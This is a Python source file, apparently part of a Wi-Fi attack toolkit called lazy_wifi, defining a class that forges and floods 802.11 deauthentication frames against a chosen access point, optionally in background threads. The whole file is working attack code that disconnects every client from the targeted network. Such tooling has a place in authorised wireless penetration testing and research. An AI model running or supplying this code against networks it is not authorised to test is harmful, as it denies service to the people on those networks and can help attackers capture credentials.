from threading import Thread

from pyric import pyw
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp

from lazy_wifi.class_exceptions.exceptions import LazyWifiException
from lazy_wifi.context_manager.context import Context
from lazy_wifi.src.interfaces import Interfaces


class DeauthAttacker:

    def __init__(self, interface: pyw.Card, context: Context):
        self.threads = []
        self.interface_handle = interface
        self.context = context
        self.interface_manager = Interfaces(self.context)
        self.num_packets = self.context.num_deauth_packets

    def deauth_attack(self, channel: int, access_point_addr: str = "ff:ff:ff:ff:ff:ff"):
        """
            Preform Deauth attack against preferred access point

            :param: Access point mac address for the deauth target
        """
        self.interface_manager.change_channel(self.interface_handle, channel)
        try:
            pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=access_point_addr, addr3=access_point_addr) \
                  / Dot11Deauth(reason=7)
            sendp(pkt, inter=0.1, iface=self.interface_handle.dev, count=self.num_packets, verbose=0)
        except (OSError, KeyboardInterrupt):
            raise LazyWifiException

    def threaded_deauth_attack(self, channel, access_point_addr="ff:ff:ff:ff:ff:ff"):
        """
            Starts deauth attack on access point as a thread

            :param channel: channel of the access point
            :param access_point_addr: mac address of the acces point
        """
        attack = Thread(target=self.deauth_attack, args=(channel, access_point_addr))
        attack.start()
        self.threads.append(attack)
